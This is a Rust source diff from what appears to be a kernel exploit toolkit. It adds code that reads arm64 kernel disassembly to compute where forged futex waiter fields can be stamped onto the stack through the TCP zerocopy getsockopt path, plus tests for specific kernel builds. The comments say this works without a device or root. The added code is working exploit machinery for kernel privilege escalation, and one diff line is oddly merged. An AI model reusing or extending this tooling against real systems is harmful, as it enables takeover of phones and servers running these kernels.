@@ -119,11 +119,196 @@ pub fn tcp_zerocopy_receive_inlined(
     false
 }
 
+/// The tcp_zerocopy delivery geometry: the fake `waiter->task`/`waiter->lock`
+/// words are stamped through the `getsockopt` local the kernel copies from the
+/// user buffer. Buffer words 0x28/0x30 land on `waiter+0x30`/`waiter+0x38`
+/// only while that local sits exactly 8 bytes above the futex waiter, and the
+/// copy cap must reach the last fake word (0x38).
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct TcpZerocopyLayout {
+    pub copy_cap: u64,
+    pub zc_local: u64,
+    pub chain_sum: u64,
+    pub zc_depth: i64,
+    pub waiter_depth: i64,
+    pub delta: i64,
+}
+
+/// The TCP `getsockopt` chain: syscall entry, socket layer, proto-ops wrapper,
+/// protocol handler and option dispatcher. The two middle links are indirect
+/// (`sock->ops->getsockopt`, `sk_prot->getsockopt`), so the chain is named
+/// rather than walked; the direct links are validated in the derivation.
+const GETSOCKOPT_CHAIN: &[&str] = &[
+    "__arm64_sys_getsockopt",
+    "__sys_getsockopt",
+    "sock_common_getsockopt",
+    "tcp_getsockopt",
+    "do_tcp_getsockopt",
+];
+
+/// The fake waiter's last buffer word ends at 0x30 + 8; a copy cap below this
+/// cannot carry the whole stamp.
+pub const TCP_FAKE_WAITER_END: u64 = 0x38;
+
+/// `&zc` at the `tcp_zerocopy_receive` call site: the second argument is the
+/// copied user struct, addressed as `sp + local` (or plain `sp`).
+fn zc_local_before_call(lines: &[String], target: u64) -> Option<u64> {
+    let call = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).ok()?;
+    let add = Regex::new(r"(?i)\badd\s+x1,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
+    let mov = Regex::new(r"(?i)\bmov\s+x1,\s*sp\b").unwrap();
+    for (index, line) in lines.iter().enumerate() {
+        if !call.is_match(line) {
+            continue;
+        }
+        for previous in lines[..index].iter().rev().take(8) {
+            if let Some(captures) = add.captures(previous) {
+                return u64::from_str_radix(&captures[1], 16).ok();
+            }
+            if mov.is_match(previous) {
+                return Some(0);
+            }
+        }
+    }
+    None
+}
+
+/// `sizeof(struct tcp_zerocopy_receive)` from the length checks the compiler
+/// emits in `do_tcp_getsockopt`: `cmp wN, #0xc` (`offsetofend(length)`),
+/// followed by `cmp wN, #cap+1`. The two checks are adjacent on some builds;
+/// newer compilers interleave other work, so the fallback accepts a single
+/// plausible struct-size comparison anywhere in a function that carries the
+/// 0xc bound. Returns every candidate cap; the caller requires exactly one.
+fn copy_cap_from_dis(lines: &[String]) -> Vec<u64> {
+    let cmp = Regex::new(r"(?i)\bcmp\s+w(\d+),\s*#0x([0-9a-f]+)\b").unwrap();
+    let mut caps = Vec::new();
+    for (index, line) in lines.iter().enumerate() {
+        let Some(first) = cmp.captures(line) else {
+            continue;
+        };
+        if first.get(2).map(|value| value.as_str()) != Some("c") {
+            continue;
+        }
+        let register = first.get(1).unwrap().as_str().to_string();
+        let end = (index + 5).min(lines.len());
+        for next in &lines[index + 1..end] {
+            let Some(second) = cmp.captures(next) else {
+                continue;
+            };
+            if second.get(1).map(|value| value.as_str()) != Some(register.as_str()) {
+                continue;
+            }
+            let Some(limit) =
+                u64::from_str_radix(second.get(2).unwrap().as_str(), 16).ok()
+            else {
+                continue;
+            };
+            if (0x11..=0x101).contains(&limit) {
+                caps.push(limit - 1);
+            }
+        }
+    }
+    caps.sort_unstable();
+    caps.dedup();
+    if !caps.is_empty() {
+        return caps;
+    }
+    // Fallback for the split-check shape (6.12.x): the cap comparison is no
+    // longer next to the 0xc bound. Only accept struct sizes that occur in
+    // practice, and only in a function that has the bound.
+    let has_bound = lines.iter().any(|line| {
+        cmp.captures(line)
+            .is_some_and(|c| c.get(2).map(|v| v.as_str()) == Some("c"))
+    });
+    if !has_bound {
+        return caps;
+    }
+    for line in lines {
+        let Some(captures) = cmp.captures(line) else {
+            continue;
+        };
+        let Some(limit) = u64::from_str_radix(captures.get(2).unwrap().as_str(), 16).ok() else {
+            continue;
+        };
+        if PLAUSIBLE_TCP_CAPS.contains(&(limit.saturating_sub(1))) {
+            caps.push(limit - 1);
+        }
+    }
+    caps.sort_unstable();
+    caps.dedup();
+    caps
+}
+
+/// Struct sizes the fallback accepts; the real `tcp_zerocopy_receive` sizes
+/// are 0x18 (5.10.81), 0x28 (5.10.236) and 0x40 (6.1+), with headroom for a
+/// future field addition.
+const PLAUSIBLE_TCP_CAPS: &[u64] = &[0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60];
+
+/// Derive the tcp_zerocopy delivery relation from the image. `waiter_depth`
+/// comes from the pselect/futex derivation (the same negative depth space).
+pub fn derive_tcp_zerocopy_layout(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+    waiter_depth: i64,
+) -> Result<TcpZerocopyLayout> {
+    let receive = unique_offset(symbols, "tcp_zerocopy_receive").map_err(|_| {
+        ExtractError::new(
+            "tcp_zerocopy_receive is absent from kallsyms (inlined or missing); \
+             the zc local is not derivable",
+        )
+    })?;
+    let dis = disassemble_symbol(
+        kernel,
+        symbols,
+        sorted_offsets,
+        "do_tcp_getsockopt",
+        OBJDUMP_CAP,
+    )?;
+    let zc_local = zc_local_before_call(&dis, receive).ok_or_else(|| {
+        ExtractError::new(
+            "do_tcp_getsockopt: no tcp_zerocopy_receive call with a stack zc local",
+        )
+    })?;
+    let mut caps = copy_cap_from_dis(&dis);
+    caps.sort_unstable();
+    caps.dedup();
+    let copy_cap = match caps.as_slice() {
+        [cap] => *cap,
+        other => {
+            return Err(ExtractError::new(format!(
+                "do_tcp_getsockopt: tcp copy cap candidates not unique: {other:x?}"
+            )))
+        }
+    };
+    for (caller, callee) in [
+        ("__arm64_sys_getsockopt", "__sys_getsockopt"),
+        ("tcp_getsockopt", "do_tcp_getsockopt"),
+    ] {
+        let caller_dis = disassemble_symbol(kernel, symbols, sorted_offsets, caller, OBJDUMP_CAP)?;
+        let target = unique_offset(symbols, callee)?;
+        if !has_direct_call(&caller_dis, target) {
+            return Err(ExtractError::new(format!(
+                "{caller} does not directly call {callee}"
+            )));
+        }
+    }
+    let chain_sum = sum_chain_frames(kernel, symbols, sorted_offsets, GETSOCKOPT_CHAIN)?;
+    let zc_depth = -(chain_sum as i64) + zc_local as i64;
+    let delta = zc_depth - (waiter_depth + 8);
+    Ok(TcpZerocopyLayout {
+        copy_cap,
+        zc_local,
+        chain_sum,
+        zc_depth,
+        waiter_depth,
+        delta,
+    })
+}
+
 /// One-shot multicast stack geometry derived from the target kernel image
 /// (no device, no root). Depths are measured from the syscall stack top.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub struct McastWaiterGeometry {
-    pub waiter_off: u64,
+pub struct McastWaiterGeometry {    pub waiter_off: u64,
     pub setsockopt_depth: u64,
     pub waiter_depth: u64,
 }
@@ -479,6 +664,75 @@ mod tests {
         assert_eq!(off(0x370, 0x18, 0x390, 0x98), 0x60);
         // PD2361 5.15.178 (static candidate = 0x50).
         assert_eq!(off(0x370, 0x18, 0x330, 0x28), 0x50);
+    }
+
+    #[test]
+    fn tcp_zc_local_is_the_call_sites_second_argument() {
+        // 5.10.236 shape: the copy block and the tcp_zerocopy_receive call.
+        let dis: Vec<String> = vec![
+            "add x0, sp, #0x28".to_string(),
+            "mov x1, x19".to_string(),
+            "mov x2, x20".to_string(),
+            "bl 0x145c55c".to_string(),
+            "cbnz x0, 0x145d6e8".to_string(),
+            "mov x0, x21".to_string(),
+            "add x1, sp, #0x28".to_string(),
+            "mov x0, x21".to_string(),
+            "bl 0x145fbb0".to_string(),
+        ];
+        assert_eq!(super::zc_local_before_call(&dis, 0x145fbb0), Some(0x28));
+        assert_eq!(super::zc_local_before_call(&dis, 0xdead), None);
+        let plain: Vec<String> = vec![
+            "mov x1, sp".to_string(),
+            "mov x0, x21".to_string(),
+            "bl 0x900".to_string(),
+        ];
+        assert_eq!(super::zc_local_before_call(&plain, 0x900), Some(0));
+    }
+
+    #[test]
+    fn tcp_copy_cap_comes_from_the_0xc_limit_pair() {
+        // 5.10.236: offsetofend(length)=0xc, cap=0x28 checked as 0x29.
+        let dis: Vec<String> = vec![
+            "cmp w26, #0xc".to_string(),
+            "b.lo 0x145d6ec".to_string(),
+            "cmp w26, #0x29".to_string(),
+        ];
+        assert_eq!(super::copy_cap_from_dis(&dis), vec![0x28]);
+        // 6.1: cap=0x40 checked as 0x41; an unrelated w8 comparison later in
+        // the function must not create a second candidate.
+        let dis61: Vec<String> = vec![
+            "cmp w4, #0xc".to_string(),
+            "b.lt 0xe4e894".to_string(),
+            "cmp w4, #0x41".to_string(),
+            "b.hs 0xe4eba0".to_string(),
+            "add x0, sp, #0x40".to_string(),
+            "cmp w8, #0xc".to_string(),
+            "b.hi 0xe4eb84".to_string(),
+            "mov w9, #0x1".to_string(),
+            "mov w10, #0xae8".to_string(),
+            "lsl w9, w9, w8".to_string(),
+        ];
+        assert_eq!(super::copy_cap_from_dis(&dis61), vec![0x40]);
+        let none: Vec<String> = vec!["cmp w1, #0x10".to_string()];
+        assert!(super::copy_cap_from_dis(&none).is_empty());
+    }
+
+    #[test]
+    fn tcp_copy_cap_accepts_the_split_check_shape() {
+        // 6.12.69: the compiler separates the 0xc bound from the cap
+        // comparison; the fallback must still find 0x40 and ignore other
+        // register comparisons.
+        let dis: Vec<String> = vec![
+            "cmp w8, #0xc".to_string(),
+            "b.ge 0x31bd60".to_string(),
+            "ldr w8, [x23, #0x6f0]".to_string(),
+            "b 0x31b91c".to_string(),
+            "mov w8, #0x2".to_string(),
+            "cmp w8, #0x41".to_string(),
+            "b.hs 0x31bf2c".to_string(),
+        ];
+        assert_eq!(super::copy_cap_from_dis(&dis), vec![0x40]);
     }
 }
 
